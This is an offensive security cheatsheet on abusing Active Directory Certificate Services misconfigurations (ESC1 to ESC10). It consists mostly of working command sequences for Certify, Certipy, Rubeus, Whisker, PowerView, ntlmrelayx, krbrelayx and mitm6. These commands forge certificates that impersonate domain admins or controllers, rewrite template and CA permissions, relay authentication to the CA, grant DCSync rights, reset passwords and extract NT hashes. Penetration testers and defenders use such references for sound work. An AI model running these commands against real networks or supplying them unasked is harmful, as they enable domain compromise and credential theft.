# Active Directory Certificate Services

This cheatsheet is built from numerous papers, GitHub repos and GitBook, blogs, HTB boxes and other resources found on the web or through my experience. I will try to put as many links as possible at the end of the page to direct to more complete resources.

**If you see a missing resource, a reference, or a copy right, please immediatly contact me on Twitter :** [**@BlWasp\_**](https://twitter.com/BlWasp\_)

A cheatsheet about the different AD-CS's ESC presented by SpecterOps. All the references and resources for the commands and techniques will be listed at the end of the page, for acknowledgments and explains.

Many commands come from [here](https://www.thehacker.recipes/ad/movement/ad-cs) where I have participate for AD-CS - **Don't hesitate to read all his blog and support him !**

## Is there a CA ?

Find the **Cert Publishers** group :

* From UNIX-like systems: `rpc net group members "Cert Publishers" -U "DOMAIN"/"User"%"Password" -S "DomainController"`
* From Windows systems: `net group "Cert Publishers" /domain`

Find the PKI : `crackmapexec ldap 'domaincontroller' -d 'domain' -u 'user' -p 'password' -M adcs`

Find the CA from Windows : `certutil –config – -ping`

Enumerate the HTTP ports on the servers, enumerate the shares to find **CertEnroll**, etc

## Template Attacks - ESC1, 2, 3, 9 & 10

[![image-1640805125672.png](https://hideandsec.sh/uploads/images/gallery/2021-12/scaled-1680-/mlK5E1SH1D1CzLOG-image-1640805125672.png)](https://hideandsec.sh/uploads/images/gallery/2021-12/mlK5E1SH1D1CzLOG-image-1640805125672.png)

* **ESC1** : SAN authorized & Low Privileged Users can enroll & Authentication EKU
* **ESC2** : Low Privileged Users can enroll & Any or No EKU
* **ESC3** : Certificate Request Agent EKU & Enrollment agent restrictions are not implemented on the CA
  * A template allows a low-privileged user to use an enrollment agent certificate.
  * Another template allows a low privileged user to use the enrollment agent certificate to request a certificate on behalf of another user, and the template defines an EKU that allows for domain authentication.

### ESC1, 2 & 3

#### Windows

**ESC1 & 2**

```powershell
# Find vulnerable/abusable certificate templates using default low-privileged group
Certify.exe find /vulnerable

# Find vulnerable/abusable certificate templates using all groups the current user context is a part of:
Certify.exe find /vulnerable /currentuser

# Request certificate with SAN
Certify.exe request /ca:'domain\ca' /template:"Vulnerable template" /altname:"admin"

# Convert PEM to PFX (from Linux)
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out admin.pfx
```

If **ANY EKU** but no Client Authentication, it can be used as en **ESC3**.

**ESC2 & 3**

```powershell
# Request an enrollment agent certificate
Certify.exe request /ca:CA.contoso.local\CA /template:Vuln-EnrollAgentTemplate

# Request a certificate on behalf of another to a template that allow for domain authentication
Certify.exe request /ca:CA.contoso.local\CA /template:User /onbehalfon:CONTOSO\Admin /enrollcert:enrollmentAgentCert.pfx /enrollcertpw:Passw0rd!
```

#### Linux

**ESC1 & 2**

```bash
# enumerate and save text, json and bloodhound (original) outputs
certipy find -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -old-bloodhound

# quickly spot vulnerable elements
certipy find -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -vulnerable -stdout

#To specify a user account in the SAN
certipy req -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'vulnerable template' -upn 'domain admin'

#To specify a computer account in the SAN
certipy req -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'vulnerable template' -dns 'dc.contoso.local'
```

If **ANY EKU** but no Client Authentication, it can be used as en **ESC3**.

**ESC2 & 3**

```bash
# Request a certificate specifying the Certificate Request Agent EKU
certipy req -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'vulnerable template'

# Used issued certificate to request another certificate on behalf of another user
certipy req -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'User' -on-behalf-of 'contoso\domain admin' -pfx 'user.pfx'
```

### ESC9 & 10

* **ESC9** : No security extension, the certificate attribute `msPKI-Enrollment-Flag` contains the flag `CT_FLAG_NO_SECURITY_EXTENSION`
  * `StrongCertificateBindingEnforcement` not set to `2` (default: `1`) or `CertificateMappingMethods` contains `UPN` flag (`0x4`)
  * The template contains the `CT_FLAG_NO_SECURITY_EXTENSION` flag in the `msPKI-Enrollment-Flag` value
  * The template specifies client authentication
  * `GenericWrite` right against any account A to compromise any account B
* **ESC10** : Weak certificate mapping
  * Case 1 : `StrongCertificateBindingEnforcement` set to `0`, meaning no strong mapping is performed
    * A template that specifiy client authentication is enabled
    * `GenericWrite` right against any account A to compromise any account B
  * Case 2 : `CertificateMappingMethods` is set to `0x4`, meaning no strong mapping is performed and only the UPN will be checked
    * A template that specifiy client authentication is enabled
    * `GenericWrite` right against any account A to compromise any account B without a UPN already set (machine accounts or buit-in Administrator account for example)

#### Windows

**ESC9**

Here, **user1** has `GenericWrite` against **user2** and want to compromise **user3**. **user2** is allowed to enroll in a vulnerable template that specifies the `CT_FLAG_NO_SECURITY_EXTENSION` flag in the `msPKI-Enrollment-Flag` value.

```powershell
#Retrieve user2 creds via Shadow Credentials
Whisker.exe add /target:"user2" /domain:"contoso.local" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
#Change user2 UPN to user3
Set-DomainObject user2 -Set @{'userPrincipalName'='user3'} -Verbose
#Request vulnerable certif with user2
Certify.exe request /ca:'contoso\ca' /template:"Vulnerable template"
#user2 UPN change back
Set-DomainObject user2 -Set @{'userPrincipalName'='user2@contoso.local'} -Verbose
#Authenticate with the certif and obtain user3 hash during UnPac the hash
Rubeus.exe asktgt /getcredentials /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"contoso.local" /dc:"DOMAIN_CONTROLLER" /show
```

**ESC10 - Case 1**

Here, **user1** has `GenericWrite` against **user2** and want to compromise **user3**.

```powershell
#Retrieve user2 creds via Shadow Credentials
Whisker.exe add /target:"user2" /domain:"contoso.local" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
#Change user2 UPN to user3
Set-DomainObject user2 -Set @{'userPrincipalName'='user3'} -Verbose
#Request authentication certif with user2
Certify.exe request /ca:'contoso\ca' /template:"User"
#user2 UPN change back
Set-DomainObject user2 -Set @{'userPrincipalName'='user2@contoso.local'} -Verbose
#Authenticate with the certif and obtain user3 hash during UnPac the hash
Rubeus.exe asktgt /getcredentials /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"contoso.local" /dc:"DOMAIN_CONTROLLER" /show
```

**ESC10 - Case 2**

Here, **user1** has `GenericWrite` against **user2** and want to compromise the domain controller **DC$@contoso.local**.

```powershell
#Retrieve user2 creds via Shadow Credentials
Whisker.exe add /target:"user2" /domain:"contoso.local" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
#Change user2 UPN to DC$@contoso.local
Set-DomainObject user2 -Set @{'userPrincipalName'='DC$@contoso.local'} -Verbose
#Request authentication certif with user2
Certify.exe request /ca:'contoso\ca' /template:"User"
#user2 UPN change back
Set-DomainObject user2 -Set @{'userPrincipalName'='user2@contoso.local'} -Verbose
```

Now, authentication with the obtained certificate will be performed through Schannel. It can be used to perform, for example, an RBCD.

#### Linux

**ESC9**

Here, **user1** has `GenericWrite` against **user2** and want to compromise **user3**. **user2** is allowed to enroll in a vulnerable template that specifies the `CT_FLAG_NO_SECURITY_EXTENSION` flag in the `msPKI-Enrollment-Flag` value.

```bash
#Retrieve user2 creds via Shadow Credentials
certipy shadow auto -username 'user1@contoso.local' -p 'password' -account user2
#Change user2 UPN to user3
certipy account update -username 'user1@contoso.local' -p 'password' -user user2 -upn user3
#Request vulnerable certif with user2
certipy req -username 'user2@contoso.local' -hash 'hash_value' -target 'ca_host' -ca 'ca_name' -template 'vulnerable template'
#user2 UPN change back
certipy account update -username 'user1@contoso.local' -p 'password' -user user2 -upn user2@contoso.local
#Authenticate with the certif and obtain user3 hash during UnPac the hash
certipy auth -pfx 'user3.pfx' -domain 'contoso.local'
```

**ESC10 - Case 1**

Here, **user1** has `GenericWrite` against **user2** and want to compromise **user3**.

```bash
#Retrieve user2 creds via Shadow Credentials
certipy shadow auto -username 'user1@contoso.local' -p 'password' -account user2
#Change user2 UPN to user3
certipy account update -username 'user1@contoso.local' -p 'password' -user user2 -upn user3
#Request authentication certif with user2
certipy req -username 'user2@contoso.local' -hash 'hash_value' -ca 'ca_name' -template 'User'
#user2 UPN change back
certipy account update -username 'user1@contoso.local' -p 'password' -user user2 -upn user2@contoso.local
#Authenticate with the certif and obtain user3 hash during UnPac the hash
certipy auth -pfx 'user3.pfx' -domain 'contoso.local'
```

**ESC10 - Case 2**

Here, **user1** has `GenericWrite` against **user2** and want to compromise the domain controller **DC$@contoso.local**.

```bash
#Retrieve user2 creds via Shadow Credentials
certipy shadow auto -username 'user1@contoso.local' -p 'password' -account user2
#Change user2 UPN to DC$@contoso.local
certipy account update -username 'user1@contoso.local' -p 'password' -user user2 -upn 'DC$@contoso.local'
#Request authentication certif with user2
certipy req -username 'user2@contoso.local' -hash 'hash_value' -ca 'ca_name' -template 'User'
#user2 UPN change back
certipy account update -username 'user1@contoso.local' -p 'password' -user user2 -upn user2@contoso.local
#Authenticate through Schannel to realise a RBCD in a LDAP shell
certipy auth -pfx dc.pfx -dc-ip 'DC_IP' -ldap-shell
```

## Access Controls Attacks - ESC4, 5, 7

### ESC4 : Sufficient rights against a template

* [https://github.com/daem0nc0re/Abusing\_Weak\_ACL\_on\_Certificate\_Templates](https://github.com/daem0nc0re/Abusing\_Weak\_ACL\_on\_Certificate\_Templates)
* [https://http418infosec.com/ad-cs-the-certified-pre-owned-attacks#esc4](https://http418infosec.com/ad-cs-the-certified-pre-owned-attacks#esc4)

1. Get Enrollment rights for the vulnerable template
2. Disable `PEND_ALL_REQUESTS` flag in `mspki-enrollment-flag` for disabling Manager Approval
3. Set `mspki-ra-signature` attribute to `0` for disabling Authorized Signature requirement
4. Enable `ENROLLEE_SUPPLIES_SUBJECT` flag in `mspki-certificate-name-flag` for specifying high privileged account name as a SAN
5. Set `mspki-certificate-application-policy` to a certificate purpose for authentication
   * Client Authentication (OID: `1.3.6.1.5.5.7.3.2`)
   * Smart Card Logon (OID: `1.3.6.1.4.1.311.20.2.2`)
   * PKINIT Client Authentication (OID: `1.3.6.1.5.2.3.4`)
   * Any Purpose (OID: `2.5.29.37.0`)
   * No EKU
6. Request a high privileged certificate for authentication and perform Pass-The-Ticket attack

#### Windows

```powershell
# Add Certificate-Enrollment rights
Add-DomainObjectAcl -TargetIdentity templateName -PrincipalIdentity "Domain Users" -RightsGUID "0e10c968-78fb-11d2-90d4-00c04f79dc55" -TargetSearchBase "LDAP://CN=Configuration,DC=contoso,DC=local" -Verbose

# Disabling Manager Approval Requirement
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local" -Identity tempalteName -XOR @{'mspki-enrollment-flag'=2} -Verbose

# Disabling Authorized Signature Requirement
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local" -Identity templateName -Set @{'mspki-ra-signature'=0} -Verbose

# Enabling SAN Specification
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local" -Identity templateName -XOR @{'mspki-certificate-name-flag'=1} -Verbose

# Editting Certificate Application Policy Extension
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local" -Identity templateName -Set @{'mspki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'} -Verbose
```

#### Linux

* Quick override and restore

```bash
# Overwrite the certificate template and save the old configuration
certipy template -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -template templateName -save-old

# After the ESC1 attack, restore the original configuration
certipy template -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -template templateName -configuration 'templateName.json'
```

* Precise modification

```bash
# Query a certificate template (all attributes)
python3 modifyCertTemplate.py -template templateName contoso.local/user:pass

# Query the raw values of all template attributes
python3 modifyCertTemplate.py -template templateName -raw contoso.local/user:pass

# Query the ACL for a certificate template
python3 modifyCertTemplate.py -template templateName -get-acl contoso.local/user:pass


# Disabling Manager Approval Requirement
python3 modifyCertTemplate.py -template templateName -value 2 -property mspki-enrollment-flag contoso.local/user:pass 

# Disabling Authorized Signature Requirement
python3 modifyCertTemplate.py -template templateName -value 0 -property mspki-ra-signature contoso.local/user:pass 

# Enabling SAN Specification
python3 modifyCertTemplate.py -template templateName -add enrollee_supplies_subject -property msPKI-Certificate-Name-Flag contoso.local/user:pass 

# Editting Certificate Application Policy Extension
python3 modifyCertTemplate.py -template templateName -value "'1.3.6.1.5.5.7.3.2', '1.3.6.1.5.2.3.4'" -property mspki-certificate-application-policy contoso.local/user:pass 
```

### ESC5 : Sufficient rights against several objects

* CA server’s AD computer object (i.e., compromise through RBCD)
* The CA server’s RPC/DCOM server
* Any descendant AD object or container in the container `CN=Public Key Services,CN=Services,CN=Configuration,DC=<COMPANY>,DC=<COM>` (e.g., the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, the Enrollment Services container, etc.)

### ESC7 : Sufficient rights against the CA

* [https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse#vulnerable-ca-aces-esc7](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse#vulnerable-ca-aces-esc7)

#### Windows

* _If an attacker gains control over a principal that has the **ManageCA** right over the CA, he can remotely flip the `EDITF_ATTRIBUTESUBJECTALTNAME2` bit to allow SAN specification in any template_

```powershell
# If RSAT is not present on the machine
DISM.exe /Online /Get-Capabilities
DISM.exe /Online /add-capability /CapabilityName:Rsat.CertificateServices.Tools~~~~0.0.1.0

# Install PSPKI
Install-Module -Name PSPKI
Import-Module PSPKI
PSPKI > Get-CertificationAuthority -ComputerName CA.contoso.local | Get-CertificationAuthorityAcl | select -ExpandProperty access

$configReader = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "CA.contoso.com"
$configReader.SetRootNode($true)
$configReader.GetConfigEntry("EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
$configReader.SetConfigEntry(1376590, "EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")

# Check after setting the flag (EDITF_ATTRIBUTESUBJECTALTNAME2 should appear in the output)
certutil.exe -config "CA.consoto.local\CA" -getreg "policy\EditFlags"
reg query \\CA.contoso.com\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\contoso-CA-CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy /v EditFlags
```

* _If an attacker gains control over a principal that has the **ManageCertificates** right over the CA, he can remotely approve pending certificate requests, subvertnig the "CA certificate manager approval" protection_

```powershell
# Request a certificate that requires manager approval with Certify
Certify.exe request /ca:CA.contoso.local\CA01 /template:ApprovalNeeded
...
[*] Request ID : 1337

# Approve a pending request with PSPKI
PSPKI > Get-CertificationAuthority -ComputerName CA.contoso.local | Get-PendingRequest -RequestID 1337 | Approve-CertificateRequest

# Download the issued certificate with Certify
Certify.exe download /ca:CA.contoso.local\CA01 /id:1337
```

#### Linux

When it is not possible to restart the `CertSvc` service to enable the `EDITF_ATTRIBUTESUBJECTALTNAME2 attribute`,the built-in template **SubCA** can be usefull.

It is vulnerable to the **ESC1** attack, but only **Domain Admins** and **Enterprise Admins** can enroll in it. If a standard user try to enroll in it with [Certipy](https://github.com/ly4k/Certipy), he will encounter a `CERTSRV_E_TEMPLATE_DENIED` errror and will obtain a request ID with a corresponding private key.

This ID can be used by a user with the **ManageCA** _and_ **ManageCertificates** rights to validate the failed request. Then, the user can retrieve the issued certificate by specifying the same ID.

* With **ManageCA** right it is possible to promote new officier and enable templates

```bash
# Add a new officier
certipy ca -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -ca 'ca_name' -add-officier 'user'

# List all the templates
certipy ca -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -ca 'ca_name' -list-templates

# Enable a certificate template
certipy ca -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -ca 'ca_name' -enable-template 'SubCA'
```

* With **ManageCertificates** AND **ManageCA** it is possible to issue certificate from failed request

```bash
# Issue a failed request (need ManageCA and ManageCertificates rights for a failed request)
certipy ca -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -issue-request 100

# Retrieve an issued certificate
certipy req -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -retrieve 100
```

## CA Configuration - ESC6

If the CA flag **EDITF\_ATTRIBUTESUBJECTALTNAME2** is set, it is possible to specify a SAN in any certificate request

### Windows

```powershell
# Find info about CA
Certify.exe cas

# Find template for authent
Certify.exe /enrolleeSuppliesSubject
Certify.exe /clientauth

# Request certif with SAN
Certify.exe request /ca:'domain\ca' /template:"Certificate template" /altname:"admin"
```

### Linux

```bash
# Verify if the flag is set
certipy find -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -stdout | grep "User Specified SAN"

#To specify a user account in the SAN
certipy req -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -ca 'ca_name' -template 'vulnerable template' -upn 'domain admin'

#To specify a computer account in the SAN
certipy req -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -ca 'ca_name' -template 'vulnerable template' -dns 'dc.contoso.local'
```

## HTTP Endpoint - ESC8

If the HTTP endpoint is up on the CA and it accept NTLM authentication, it is vulnerable to NTLM or Kerberos relay.

### NTLM Relay

```bash
# Prepare relay
ntlmrelayx -t "http://CA/certsrv/certfnsh.asp" --adcs --template "Template name"
# Find a way to leak the machine or user Net-NTLM hash (Printerbug, Petitpotam, PrivExchange, etc)
```

### Kerberos Relay

It is possible with the last versions of **mitm6** and **krbrelayx**.

```bash
#Setup the relay
sudo krbrelayx.py --target http://CA/certsrv -ip attacker_IP --victim target.domain.local --adcs --template Machine

#Run mitm6
sudo mitm6 --domain domain.local --host-allowlist target.domain.local --relay CA.domain.local -v
```

## Pass-The-Certificate

### PKINIT

With a certificate valid for authentication, it is possible to request a TGT via the **PKINIT** protocol

#### Windows

```powershell
# Information about a cert file
certutil -v -dump admin.pfx

# From a Base64 PFX
Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:cert.pfx /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
```

#### Linux

```bash
# Authentication with PFX/P12 file
certipy auth -pfx 'user.pfx' -no-hash

# PEM certificate (file) + PEM private key (file)
gettgtpkinit.py -cert-pem "PATH_TO_PEM_CERT" -key-pem "PATH_TO_PEM_KEY" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"

# PFX certificate (file) + password (string, optionnal)
gettgtpkinit.py -cert-pfx "PATH_TO_PFX_CERT" -pfx-pass "CERT_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
```

### Schannel

If PKINIT is not working on the domain, LDAPS can be used to pass the certificate with `PassTheCert`.

#### Windows

* Grant DCSync rights to an user

```powershell
./PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --elevate --target "DC=domain,DC=local" --sid <user_SID>

#To restore
./PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --elevate --target "DC=domain,DC=local" --restore restoration_file.txt
```

* Add computer account

```powershell
./PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --add-computer --computer-name TEST$ --computer-password <password>
```

* RBCD

```powershell
./PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --rbcd --target "CN=DC,OU=Domain Controllers,DC=domain,DC=local" --sid <controlled_computer_SID>
```

* Reset password

```powershell
./PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --reset-password --target "CN=user1,OU=Users,DC=domain,DC=local" --new-password <new_password>
```

#### Linux

For RBCD attack

```bash
#Create a new computer account
python3 passthecert.py -action add_computer -crt user.crt -key user.key -domain domain.local -dc-ip 10.0.0.1

#Add delegation rights
python3 passthecert.py -action write_rbcd -crt user.crt -key user.key -domain domain.local -dc-ip 10.0.0.1 -port 389 -delegate-to <created_computer> -delegate-from TARGET$

#Impersonation is now possible
```

### UnPAC the Hash

When a TGT is requested with PKINIT, the **LM:NT hash** in added in the structure `PAC_CREDENTIAL_INFO` for futur use if Kerberos is not supported, and the PAC is ciphered with the krbtgt key. When a TGS is requested from the TGT, the same structure is added, but ciphered with the session key.

The structure can be unciphered if a TGS-REQ U2U is realised.

#### Windows

```powershell
Rubeus.exe asktgt /getcredentials /user:"TARGET_SAMNAME" /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
```

#### Linux

```bash
# Authenticate and recover the NT hash
certipy auth -pfx 'user.pfx' -no-save
```

## References <a href="#bkmrk-references" id="bkmrk-references"></a>

* [SpecterOps](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
* [The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ad-cs)
* [Certipy](https://github.com/ly4k/Certipy)
* [Certipy2.0 blog](https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6)
* [Certipy4.0 blog](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [Certify](https://github.com/GhostPack/Certify)
* [modifyCertTemplate](https://github.com/fortalice/modifyCertTemplate)
* [HTTP418 Infosec](https://http418infosec.com/ad-cs-the-certified-pre-owned-attacks)
* [Snovvcrash](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse)
* [Weak ACLs](https://github.com/daem0nc0re/Abusing\_Weak\_ACL\_on\_Certificate\_Templates)
